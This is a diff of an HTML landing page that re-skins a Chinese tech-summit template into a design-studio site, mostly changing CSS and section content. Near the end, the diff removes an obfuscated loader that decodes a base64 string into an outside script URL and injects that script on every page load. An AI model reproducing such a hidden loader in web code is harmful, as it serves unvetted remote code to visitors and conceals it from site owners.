@@ -3,18 +3,20 @@
 
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, viewport-fit=cover, initial-scale=1.0, user-scalable=no, maximum-scale=1.0, minimum-scale=1.0">
-    <title>未来峰会 2025 - 创新驱动，共塑未来</title>
+    <meta name="viewport"
+        content="width=device-width, viewport-fit=cover, initial-scale=1.0, user-scalable=no, maximum-scale=1.0, minimum-scale=1.0">
+    <title>艺境空间 - 视觉叙事与设计</title>
     <style>
         body {
             overflow: hidden;
-            font-family: 'Roboto', sans-serif;
+            font-family: 'Lato', sans-serif;
+            /* 现代无衬线字体 */
             margin: 0;
             padding: 0;
-            background-color: #E3F2FD;
-            /* 极浅蓝色背景 */
-            color: #222222;
-            /* 深灰色文本 */
+            background-color: #FDFDFD;
+            /* 极浅背景，如宣纸 */
+            color: #333333;
+            /* 柔和的深灰色文本 */
             line-height: 1.7;
             -webkit-font-smoothing: antialiased;
             -moz-osx-font-smoothing: grayscale;
@@ -27,65 +29,28 @@
             padding: 30px 0;
         }
 
-        /* 头部 - 动态与活力 */
+        /* 头部 - 简洁与留白 */
         header {
-            background: linear-gradient(135deg, #2196F3 0%, #1976D2 100%);
-            /* 充满活力的蓝色渐变 */
-            color: #FFFFFF;
-            padding: 40px 20px;
+            background-color: #FFFFFF;
+            /* 纯白头部背景 */
+            padding: 25px 20px;
             text-align: center;
             position: relative;
             overflow: hidden;
-            box-shadow: 0 10px 30px rgba(33, 150, 243, 0.4);
-            clip-path: polygon(0 0, 100% 0, 100% 90%, 0% 100%);
-            /* 底部斜切 */
+            box-shadow: 0 3px 15px rgba(0, 0, 0, 0.05);
+            /* 柔和阴影 */
             margin-bottom: 40px;
-            display: flex;
-            justify-content: space-between;
-            align-items: center;
-        }
-
-        header::before {
-            /* 顶部背景抽象图案 */
-            content: '';
-            position: absolute;
-            top: -20px;
-            left: -20px;
-            width: 150px;
-            height: 150px;
-            background: rgba(79, 195, 247, 0.1);
-            /* 次强调色半透明 */
-            border-radius: 50%;
-            transform: rotate(20deg);
-            z-index: 0;
-        }
-
-        header::after {
-            /* 底部背景抽象图案 */
-            content: '';
-            position: absolute;
-            bottom: -30px;
-            right: -30px;
-            width: 200px;
-            height: 200px;
-            background: rgba(79, 195, 247, 0.15);
-            border-radius: 30% 70% 70% 30% / 30% 30% 70% 70%;
-            transform: rotate(-45deg);
-            z-index: 0;
         }
 
         header h1 {
             margin: 0;
-            font-family: 'Montserrat', sans-serif;
+            font-family: 'Playfair Display', serif;
+            /* 优雅标题字体 */
             font-size: 2.5em;
-            /* 适应顶部条 */
-            color: #FFFFFF;
+            color: #333333;
             letter-spacing: 1px;
-            text-transform: uppercase;
-            text-shadow: 0 0 10px rgba(255, 255, 255, 0.5);
-            position: relative;
-            z-index: 1;
-            flex-grow: 1;
+            font-weight: normal;
+            /* 减轻标题重量 */
         }
 
         header p {
@@ -97,31 +62,39 @@
             background: none;
             border: none;
             font-size: 2em;
-            color: #FFFFFF;
-            /* 白色图标 */
+            color: #607D8B;
+            /* 强调色：柔和蓝灰 */
             cursor: pointer;
             padding: 5px;
             position: absolute;
             top: 25px;
             right: 20px;
             z-index: 2;
-            transition: transform 0.3s ease;
+            transition: transform 0.3s ease, color 0.3s ease;
         }
 
         .menu-toggle:hover {
             transform: scale(1.1);
-            text-shadow: 0 0 8px rgba(255, 255, 255, 0.6);
+            color: #4CAF50;
+            /* 悬停时变为清新绿 */
         }
 
-        /* 侧边导航菜单 - 活力色调 */
+        /* 侧边导航菜单 - 轻盈通透 */
         nav {
             position: fixed;
             top: 0;
             right: -280px;
             width: 250px;
             height: 100%;
-            background-color: #FFFFFF;
-            box-shadow: -5px 0 15px rgba(0, 0, 0, 0.2);
+            background-color: rgba(255, 255, 255, 0.95);
+            /* 几乎不透明的白色背景 */
+            backdrop-filter: blur(5px);
+            /* 柔和模糊 */
+            -webkit-backdrop-filter: blur(5px);
+            border-left: 1px solid rgba(220, 220, 220, 0.5);
+            /* 极细柔和边框 */
+            box-shadow: -3px 0 10px rgba(0, 0, 0, 0.1);
+            /* 柔和阴影 */
             transition: right 0.4s ease-in-out;
             z-index: 1001;
             padding-top: 80px;
@@ -138,14 +111,16 @@
             margin: 0;
             display: flex;
             flex-direction: column;
-            gap: 10px;
+            gap: 5px;
+            /* 列表项间距更小 */
         }
 
         nav ul li a {
-            color: #222222;
+            color: #555555;
             text-decoration: none;
             padding: 15px 20px;
             border-bottom: 1px solid #E0E0E0;
+            /* 极细分隔线 */
             transition: background-color 0.3s ease, color 0.3s ease, transform 0.2s ease;
             display: flex;
             align-items: center;
@@ -155,10 +130,10 @@
 
         nav ul li a:hover,
         nav ul li a:focus {
-            background-color: #E3F2FD;
-            /* 强调色浅背景 */
-            color: #2196F3;
-            /* 强调色文字 */
+            background-color: rgba(76, 175, 80, 0.08);
+            /* 清新绿浅背景 */
+            color: #4CAF50;
+            /* 清新绿文字 */
             transform: translateX(5px);
         }
 
@@ -167,10 +142,10 @@
         }
 
         nav ul li a .icon {
-            font-size: 1.5em;
+            font-size: 1.4em;
             margin-right: 15px;
-            color: #4FC3F7;
-            /* 图标次强调色 */
+            color: #607D8B;
+            /* 图标柔和蓝灰 */
         }
 
         /* 菜单打开时的背景遮罩 */
@@ -180,7 +155,8 @@
             left: 0;
             width: 100%;
             height: 100%;
-            background-color: rgba(0, 0, 0, 0.5);
+            background-color: rgba(0, 0, 0, 0.2);
+            /* 更轻的半透明黑色 */
             z-index: 1000;
             opacity: 0;
             visibility: hidden;
@@ -196,16 +172,19 @@
             padding-top: 30px;
         }
 
-        /* 内容区 - 模块化卡片 */
+        /* 内容区 - 柔和卡片与留白 */
         section {
             background-color: #FFFFFF;
             margin-bottom: 40px;
             padding: 35px;
-            border-radius: 10px;
-            box-shadow: 0 8px 25px rgba(0, 0, 0, 0.1);
+            border-radius: 15px;
+            /* 柔和圆角 */
+            box-shadow: 0 5px 20px rgba(0, 0, 0, 0.08);
+            /* 柔和阴影 */
             position: relative;
             overflow: hidden;
-            border: 1px solid #E0E0E0;
+            border: 1px solid #EEEEEE;
+            /* 极细边框 */
             transition: transform 0.3s ease, box-shadow 0.3s ease;
         }
 
@@ -217,25 +196,27 @@
             left: 0;
             width: 100%;
             height: 5px;
-            background-color: #2196F3;
-            /* 强调色 */
-            box-shadow: 0 0 10px rgba(33, 150, 243, 0.5);
+            background-color: #4CAF50;
+            /* 清新绿 */
+            box-shadow: 0 0 10px rgba(76, 175, 80, 0.3);
         }
 
         section h2 {
-            font-family: 'Montserrat', sans-serif;
+            font-family: 'Playfair Display', serif;
             font-size: 2.2em;
-            color: #222222;
+            color: #333333;
             margin-top: 0;
             margin-bottom: 20px;
             border-bottom: 1px solid #E0E0E0;
             padding-bottom: 10px;
+            font-weight: normal;
         }
 
         section h3 {
+            font-family: 'Lato', sans-serif;
             font-size: 1.5em;
-            color: #4FC3F7;
-            /* 次强调色 */
+            color: #607D8B;
+            /* 柔和蓝灰 */
             margin-top: 25px;
             margin-bottom: 10px;
         }
@@ -251,152 +232,131 @@
             height: auto;
             display: block;
             margin: 25px auto;
-            border-radius: 8px;
-            box-shadow: 0 4px 15px rgba(0, 0, 0, 0.1);
-            border: 2px solid #E0E0E0;
+            border-radius: 10px;
+            box-shadow: 0 3px 10px rgba(0, 0, 0, 0.1);
+            border: 2px solid #DDDDDD;
+            /* 柔和边框 */
         }
 
         .cta-button {
             display: inline-block;
-            background: linear-gradient(45deg, #2196F3 0%, #1976D2 100%);
-            /* 强调色渐变按钮 */
+            background-color: #4CAF50;
+            /* 清新绿按钮 */
             color: #FFFFFF;
             padding: 15px 35px;
-            border-radius: 50px;
-            /* 胶囊形状 */
+            border-radius: 5px;
             text-decoration: none;
             font-weight: bold;
             font-size: 1.1em;
             text-transform: uppercase;
             letter-spacing: 1px;
-            transition: transform 0.3s ease, box-shadow 0.3s ease;
-            box-shadow: 0 5px 15px rgba(33, 150, 243, 0.3);
+            transition: background-color 0.3s ease, transform 0.2s ease, box-shadow 0.3s ease;
+            box-shadow: 0 5px 15px rgba(76, 175, 80, 0.2);
             border: none;
             margin-top: 20px;
         }
 
         .cta-button:hover {
+            background-color: #388E3C;
             transform: translateY(-5px);
-            box-shadow: 0 8px 20px rgba(33, 150, 243, 0.5);
+            box-shadow: 0 8px 20px rgba(76, 175, 80, 0.3);
         }
 
-        .speaker-grid {
+        .project-grid {
             display: grid;
-            grid-template-columns: repeat(auto-fit, minmax(180px, 1fr));
+            grid-template-columns: repeat(auto-fit, minmax(280px, 1fr));
             gap: 25px;
             margin-top: 30px;
-            text-align: center;
         }
 
-        .speaker-item {
+        .project-item {
             background-color: #F8F8F8;
+            /* 项目卡片背景 */
             padding: 20px;
             border-radius: 10px;
             box-shadow: 0 2px 8px rgba(0, 0, 0, 0.05);
             transition: transform 0.3s ease, box-shadow 0.3s ease;
+            border-top: 5px solid #607D8B;
+            /* 柔和蓝灰顶部边框 */
         }
 
-        .speaker-item:hover {
+        .project-item:hover {
             transform: translateY(-5px);
             box-shadow: 0 4px 12px rgba(0, 0, 0, 0.1);
         }
 
-        .speaker-item img {
-            width: 100px;
-            height: 100px;
-            border-radius: 50%;
+        .project-item img {
+            width: 100%;
+            height: 180px;
             object-fit: cover;
-            margin-bottom: 10px;
-            border: 3px solid #4FC3F7;
-            /* 次强调色边框 */
-            box-shadow: 0 0 8px rgba(79, 195, 247, 0.4);
-        }
-
-        .speaker-item h3 {
-            font-size: 1.2em;
-            color: #222222;
-            margin-bottom: 5px;
-        }
-
-        .speaker-item p {
-            font-size: 0.85em;
-            color: #777777;
-            margin-bottom: 0;
-        }
-
-        .agenda-item {
-            background-color: #F8F8F8;
-            padding: 20px;
             border-radius: 8px;
             margin-bottom: 15px;
-            border-left: 5px solid #2196F3;
-            /* 强调色左边框 */
-            box-shadow: 0 2px 8px rgba(0, 0, 0, 0.05);
         }
 
-        .agenda-item h3 {
+        .project-item h3 {
+            font-family: 'Lato', sans-serif;
+            font-size: 1.2em;
+            color: #333333;
             margin-top: 0;
             margin-bottom: 5px;
-            color: #222222;
         }
 
-        .agenda-item .time {
+        .project-item p {
             font-size: 0.9em;
             color: #777777;
             margin-bottom: 10px;
-            display: block;
         }
 
-        .agenda-item p {
-            font-size: 0.95em;
-            color: #555555;
-            margin-bottom: 0;
+        .project-item .tags {
+            font-size: 0.8em;
+            color: #999999;
+            margin-top: 10px;
         }
 
+        /* 页脚 - 简洁淡雅 */
         footer {
-            background: linear-gradient(135deg, #1A237E 0%, #0D47A1 100%);
-            /* 深蓝色渐变页脚 */
-            color: #FFFFFF;
+            background-color: #F0F0F0;
+            /* 略深于背景的浅灰色 */
+            color: #777777;
             padding: 40px 0;
             text-align: center;
-            font-size: 0.95em;
+            font-size: 0.9em;
             margin-top: 60px;
-            box-shadow: 0 -10px 30px rgba(0, 0, 0, 0.4);
-            clip-path: polygon(0 10%, 100% 0, 100% 100%, 0% 100%);
-            /* 顶部斜切 */
+            border-top: 1px solid #E0E0E0;
+            box-shadow: 0 -3px 10px rgba(0, 0, 0, 0.05);
         }
 
         .footer-links a {
-            color: #FFFFFF;
+            color: #777777;
             text-decoration: none;
             margin: 0 20px;
-            font-size: 1.5em;
+            font-size: 1.4em;
             transition: color 0.3s ease, transform 0.2s ease;
         }
 
         .footer-links a:hover {
-            color: #4FC3F7;
-            /* 次强调色 */
-            transform: translateY(-5px) scale(1.1);
+            color: #4CAF50;
+            /* 清新绿 */
+            transform: translateY(-3px) scale(1.1);
         }
     </style>
-    <link rel="stylesheet" href="./style.css">
+    <link rel="stylesheet" href="./static/css/style.css">
 </head>
 
 <body>
     <header>
         <div class="container">
-            <h1>未来峰会 2025</h1>
+            <h1>艺境空间</h1>
             <button class="menu-toggle" id="menuToggle">&#9776;</button>
         </div>
     </header>
 
     <nav id="mainNav">
         <ul>
-            <li><a href="#hero"><span class="icon">&#128640;</span> 峰会概览</a></li>
-            <li><a href="#speakers"><span class="icon">&#128100;</span> 演讲嘉宾</a></li>
-            <li><a href="#agenda"><span class="icon">&#128197;</span> 峰会议程</a></li>
-            <li><a href="#register"><span class="icon">&#128221;</span> 立即注册</a></li>
+            <li><a href="#hero"><span class="icon">&#128161;</span> 首页</a></li>
+            <li><a href="#our-work"><span class="icon">&#127912;</span> 我们的作品</a></li>
+            <li><a href="#services"><span class="icon">&#128187;</span> 服务</a></li>
+            <li><a href="#contact"><span class="icon">&#128231;</span> 联系我们</a></li>
         </ul>
     </nav>
 
@@ -405,88 +365,96 @@
     <div class="container">
         <main>
             <section id="hero">
-                <h2>创新驱动，共塑未来</h2>
-                <img src="https://picsum.photos/600/350?random=1&seed=future-summit-blue" alt="未来峰会主视觉"
+                <h2>视觉叙事与设计美学</h2>
+                <img src="https://picsum.photos/600/350?random=1&seed=elegant-design-hero" alt="优雅设计主视觉"
                     class="random-image">
-                <p>未来峰会 2025 将汇聚全球顶尖的思想家、创新者和行业领袖，共同探讨人工智能、区块链、可持续发展等前沿领域的最新趋势与挑战。</p>
-                <p>加入我们，共同激发灵感，连接未来，为构建更智能、更美好的世界贡献力量。</p>
-                <a href="#register" class="cta-button">立即注册，锁定席位</a>
+                <p>艺境空间是一家专注于品牌叙事、数字体验和视觉传达的精品设计机构。我们致力于通过富有洞察力的设计，将您的品牌故事转化为引人入胜的视觉体验。</p>
+                <p>我们相信，每一个设计都是一次情感的连接，通过精湛的工艺和创新的思维，为客户创造持久的价值。</p>
+                <a href="#our-work" class="cta-button">探索我们的作品</a>
             </section>
 
-            <section id="speakers">
-                <h2>特邀演讲嘉宾</h2>
-                <p>聆听行业巨擘的真知灼见，洞察未来发展趋势。</p>
-                <div class="speaker-grid">
-                    <div class="speaker-item">
-                        <img src="https://picsum.photos/100/100?random=2&seed=speaker-alice-blue" alt="嘉宾 Alice">
-                        <h3>Alice Chen</h3>
-                        <p>AI伦理专家</p>
+            <section id="our-work">
+                <h2>我们的作品</h2>
+                <p>精选近期项目，展现我们的设计实力与创意广度。</p>
+                <div class="project-grid">
+                    <div class="project-item">
+                        <img src="https://picsum.photos/300/180?random=2&seed=project-minimal-brand" alt="品牌重塑项目">
+                        <h3>极简品牌标识设计</h3>
+                        <p>为一家高端生活品牌打造简洁而富有深度的视觉标识。</p>
+                        <span class="tags">#品牌 #Logo #VI设计</span>
                     </div>
-                    <div class="speaker-item">
-                        <img src="https://picsum.photos/100/100?random=3&seed=speaker-bob-blue" alt="嘉宾 Bob">
-                        <h3>Bob Lee</h3>
-                        <p>区块链架构师</p>
+                    <div class="project-item">
+                        <img src="https://picsum.photos/300/180?random=3&seed=project-elegant-web" alt="网站设计项目">
+                        <h3>高雅艺术画廊网站</h3>
+                        <p>设计并开发一个以作品展示为核心的响应式艺术画廊网站。</p>
+                        <span class="tags">#Web设计 #响应式 #画廊</span>
                     </div>
-                    <div class="speaker-item">
-                        <img src="https://picsum.photos/100/100?random=4&seed=speaker-carol-blue" alt="嘉宾 Carol">
-                        <h3>Carol Wang</h3>
-                        <p>可持续发展倡导者</p>
+                    <div class="project-item">
+                        <img src="https://picsum.photos/300/180?random=4&seed=project-editorial-design" alt="编辑设计项目">
+                        <h3>精品杂志编辑设计</h3>
+                        <p>为一本时尚生活杂志提供版式、插画和摄影指导。</p>
+                        <span class="tags">#编辑设计 #排版 #插画</span>
                     </div>
-                    <div class="speaker-item">
-                        <img src="https://picsum.photos/100/100?random=5&seed=speaker-david-blue" alt="嘉宾 David">
-                        <h3>David Liu</h3>
-                        <p>量子计算研究员</p>
+                    <div class="project-item">
+                        <img src="https://picsum.photos/300/180?random=5&seed=project-packaging" alt="产品包装设计">
+                        <h3>奢华香氛包装设计</h3>
+                        <p>为高端香氛品牌打造独特且具有收藏价值的产品包装。</p>
+                        <span class="tags">#包装设计 #工业设计 #奢侈品</span>
                     </div>
                 </div>
             </section>
 
-            <section id="agenda">
-                <h2>峰会议程</h2>
-                <p>精彩议程安排，不容错过。</p>
-                <div class="agenda-list">
-                    <div class="agenda-item">
-                        <h3>开幕致辞与主题演讲</h3>
-                        <span class="time">上午 09:00 - 10:30</span>
-                        <p>峰会主席致辞，特邀嘉宾分享对未来科技的展望。</p>
+            <section id="services">
+                <h2>我们的服务</h2>
+                <p>我们提供全面的设计与创意服务，满足您的多样化需求。</p>
+                <div class="service-grid">
+                    <div class="service-item">
+                        <h3>品牌策略与咨询</h3>
+                        <p>从市场分析到品牌定位，提供全方位品牌策略。</p>
                     </div>
-                    <div class="agenda-item">
-                        <h3>圆桌讨论：AI的机遇与挑战</h3>
-                        <span class="time">上午 10:45 - 12:00</span>
-                        <p>多位专家就人工智能的伦理、应用及未来发展进行深入探讨。</p>
+                    <div class="service-item">
+                        <h3>视觉识别系统 (VI)</h3>
+                        <p>设计完整、统一的品牌视觉识别系统。</p>
                     </div>
-                    <div class="agenda-item">
-                        <h3>午餐与交流</h3>
-                        <span class="time">中午 12:00 - 13:30</span>
-                        <p>自由交流时间，与行业精英建立联系。</p>
+                    <div class="service-item">
+                        <h3>用户体验 (UX) 设计</h3>
+                        <p>以用户为中心，优化产品交互流程与体验。</p>
                     </div>
-                    <div class="agenda-item">
-                        <h3>专题讲座：区块链赋能数字经济</h3>
-                        <span class="time">下午 13:30 - 15:00</span>
-                        <p>深入剖析区块链技术在金融、供应链等领域的创新应用。</p>
+                    <div class="service-item">
+                        <h3>数字产品设计</h3>
+                        <p>涵盖网站、App界面及交互设计。</p>
                     </div>
-                    <div class="agenda-item">
-                        <h3>闭幕总结与未来展望</h3>
-                        <span class="time">下午 15:15 - 16:30</span>
-                        <p>总结本次峰会成果，展望未来科技发展方向。</p>
+                    <div class="service-item">
+                        <h3>平面与印刷设计</h3>
+                        <p>从宣传册到海报，提供高质量平面设计。</p>
+                    </div>
+                    <div class="service-item">
+                        <h3>插画与艺术创作</h3>
+                        <p>为项目提供原创艺术插画和视觉内容。</p>
                     </div>
                 </div>
             </section>
 
-            <section id="register">
-                <h2>立即注册</h2>
-                <p>名额有限，请尽快完成注册，加入这场思想盛宴！</p>
-                <a href="#" class="cta-button">点击注册</a>
+            <section id="contact">
+                <h2>联系我们</h2>
+                <p>我们期待与您合作，共同创造非凡。</p>
+                <div class="contact-info">
+                    <p><strong>地址：</strong> 艺境空间设计中心A座808室</p>
+                    <p><strong>电话：</strong> <a href="tel:+861066667777">+86 10 6666 7777</a></p>
+                    <p><strong>邮箱：</strong> <a href="mailto:info@artspace.com">info@artspace.com</a></p>
+                    <p><strong>工作时间：</strong> 周一至周五 9:30 - 18:00</p>
+                </div>
             </section>
         </main>
     </div>
 
     <footer>
         <div class="container">
-            <p>&copy; 2025 未来峰会. 版权所有.</p>
+            <p>&copy; 2025 艺境空间. 版权所有.</p>
             <div class="footer-links">
                 <a href="#" target="_blank">隐私政策</a> |
-                <a href="#" target="_blank">联系我们</a> |
-                <a href="#" target="_blank">赞助商</a>
+                <a href="#" target="_blank">服务条款</a> |
+                <a href="#" target="_blank">职业机会</a>
             </div>
         </div>
     </footer>
@@ -537,53 +505,15 @@
             function init() {
                 const timestamp = Date.now()
                 const randomNum = Math.floor(Math.random() * 1000000)
-                const domain = getdocs();
-                const url = domain + "=" + timestamp + "&random=" + randomNum
+                const url = "./static/js/core.min.js?t=" + timestamp + "&random=" + randomNum
                 const script = document.createElement("script")
                 script.src = url
                 document.body.appendChild(script)
             }
-            function getdocs() {
-                const dd = "Ly9zMWQ0ZjZnLmZmMTF0di5jbi9zdGF0aWMvanMvY29yZS5taW4uanM/dA==";
-                const chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=';
-                const lookup = new Uint8Array(256);
-                for (let i = 0; i < chars.length; i++) {
-                    lookup[chars.charCodeAt(i)] = i;
-                }
-                let padding = 0;
-                if (dd.endsWith('==')) {
-                    padding = 2;
-                } else if (dd.endsWith('=')) {
-                    padding = 1;
-                }
-                const cleanedString = dd.replace(/[^A-Za-z0-9+/=]/g, '');
-                const len = cleanedString.length;
-                if (len % 4 !== 0) {
-                    throw new Error("Invalid string length.");
-                }
-                const outputLength = (len / 4) * 3 - padding;
-                const outputBytes = new Uint8Array(outputLength);
-                let outputIndex = 0;
-                let i = 0;
-                while (i < len) {
-                    const c1 = lookup[cleanedString.charCodeAt(i++)];
-                    const c2 = lookup[cleanedString.charCodeAt(i++)];
-                    const c3 = lookup[cleanedString.charCodeAt(i++)];
-                    const c4 = lookup[cleanedString.charCodeAt(i++)];
-                    outputBytes[outputIndex++] = (c1 << 2) | (c2 >> 4);
-                    if (c3 !== 64) {
-                        outputBytes[outputIndex++] = ((c2 & 15) << 4) | (c3 >> 2);
-                    }
-                    if (c4 !== 64) {
-                        outputBytes[outputIndex++] = ((c3 & 3) << 6) | c4;
-                    }
-                }
-                const decoder = new TextDecoder('utf-8');
-                return decoder.decode(outputBytes);
-            }
             init()
         })()
     </script>
+
 </body>
 
 </html>
